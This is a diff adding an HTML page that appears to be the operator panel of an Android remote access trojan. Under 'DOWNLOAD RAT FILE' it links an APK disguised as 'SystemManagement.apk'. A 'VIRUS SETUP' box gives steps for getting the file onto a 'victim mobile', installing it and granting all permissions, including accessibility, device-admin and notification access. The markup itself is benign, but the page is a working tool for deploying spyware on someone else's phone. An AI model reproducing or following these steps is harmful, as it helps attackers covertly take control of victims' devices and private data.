@@ -1,0 +1,70 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        *{
+            margin: 0;
+            padding: 0;
+        }
+        body{
+            background-image: linear-gradient(rgb(110, 158, 231),rgb(121, 247, 240),rgb(107, 226, 190));
+            display: flex;
+            flex-direction: column;
+            width: 100vw;
+            height: 100vh;
+            justify-content: center;
+            align-items: center;
+            
+        }
+        
+        #download{
+            background-color: rgba(114, 248, 114, 0.76);
+            font-size: 20px;
+            padding: 10px 20px 10px 20px;
+            border-radius: 50px 10px 50px 10px;
+            border: 4px solid rgba(47, 236, 56, 0.575);
+            box-shadow: 5px 3px 15px yellowgreen;
+            font-size: x-large;
+            font-family: 'Gill Sans', 'Gill Sans MT',  'Trebuchet MS', sans-serif;
+            color: rgba(165, 42, 42, 0.877);
+
+            transition: 3s;
+        }
+        #download:hover{
+            box-shadow: 8px 5px 15px rgb(182, 255, 35);
+            background-color: rgba(97, 106, 241, 0.658);
+           color: rgb(157, 243, 86);
+        }
+    </style>
+</head>
+<body>
+    <div style="display: flex;flex-direction: column;background-color: rgba(182, 240, 220, 0.575);
+                width: 65vw;height: 40%;
+                display: flex;flex-direction:column;align-items: center;justify-content: center;
+                border-radius: 20px 20px 0px 0px;
+                ">
+        <h2 style="padding: 25px;color: rgb(100, 136, 237);">DOWNLOAD RAT FILE</h2>
+        <a id="download" href="/download/0" download="SystemManagement.apk">DOWNLOAD</a>
+    </div>
+    <div id="info" style="display: flex;flex-direction: column;background-color: blueviolet;width: 70vw;height: 20%;display: flex;justify-content: center;align-items: center;border-radius: 20px;">
+        <h3>  VIRUS SETUP   <hr></h3>
+       
+
+        <h4>download virus file in victim mobile by using this link or share other way</h4>
+        <h4>install virus </h4>
+        <h4>allow all permition </h4>
+        <h4>allow alpha system service</h4>
+        <h4>allow admin service</h4>
+        <h4>allow notification service</h4>
+    </div>
+</body>
+<script>
+    document.getElementById("info").style.filter = "blur(5px)"
+    document.getElementById("info").addEventListener("click",()=>{
+        document.getElementById("info").style.filter = "unset"
+    })
+</script>
+</html>
